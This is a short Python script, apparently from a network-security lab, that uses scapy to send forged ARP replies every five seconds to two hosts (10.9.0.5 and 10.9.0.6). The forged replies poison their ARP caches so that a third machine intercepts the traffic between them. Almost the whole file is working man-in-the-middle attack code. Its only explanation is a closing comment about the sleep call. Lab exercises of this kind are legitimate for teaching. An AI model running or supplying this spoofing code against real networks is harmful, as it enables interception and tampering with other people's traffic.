#!/usr/bin/env python3

from scapy.all import *
import time

# Set the target IP addresses   
target_a_ip = '10.9.0.5'  
target_b_ip = '10.9.0.6'  

# Set the MAC addresses for Hosts A, B, and M  
host_a_mac = '02:42:0a:09:00:05'  
host_b_mac = '02:42:0a:09:00:06'  
host_m_mac = '02:42:0a:09:00:69'  

# Create the ARP reply packets  
arp_a = ARP(op=2, hwsrc=host_m_mac, psrc=target_b_ip, hwdst=host_a_mac, pdst=target_a_ip)   
arp_b = ARP(op=2, hwsrc=host_m_mac, psrc=target_a_ip, hwdst=host_b_mac, pdst=target_b_ip)  

# Send the packets continuously every 5 seconds  
while True:  
    send(arp_a)  
    send(arp_b)  
    time.sleep(5)

# This script imports the time library at the beginning of the script using the import statement, and then uses 
# time.sleep(5) to pause the execution of the script for 5 seconds before continuing with the next iteration of the loop.
